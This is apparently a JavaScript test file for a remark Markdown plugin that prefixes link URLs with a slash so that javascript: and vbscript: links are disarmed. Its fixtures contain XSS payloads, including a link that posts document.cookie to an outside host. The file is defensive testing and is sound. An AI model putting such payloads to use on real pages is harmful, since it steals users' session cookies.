'use strict';

import remark from 'remark';
import plugin from '..';
import test from 'ava';

const processor = str => remark().use(plugin).processSync(str);

const testInfos = [
  {name: 'example', base: '[link](url)', result: '[link](/url)\n'},
  {name: 'local link', base: '[link](/url)', result: '[link](/url)\n'},
  {name: 'auto link', base: '<http://ache>', result: '<http://ache>\n'},
  {name: 'auto link js', base: '<javascript:alert(11);//://XSS>', result: '[javascript:alert(11);//://XSS](/javascript:alert(11);//://XSS)\n'},
  {name: 'js XSS', base: '[lol](javascript:console.log($.post("https://12z.fr/"+document.cookie)))', result: '[lol](/javascript:console.log($.post("https://12z.fr/"+document.cookie)))\n'},
  {name: 'vbscript XSS', base: '[lol](vbscript:msgbox("XSS"))', result: '[lol](/vbscript:msgbox("XSS"))\n'},
];

testInfos.forEach(testInfo => {
  test(testInfo.name, t => {
    const {base} = testInfo;
    const {result} = testInfo;
    t.is(processor(base).contents, result);
  });
});

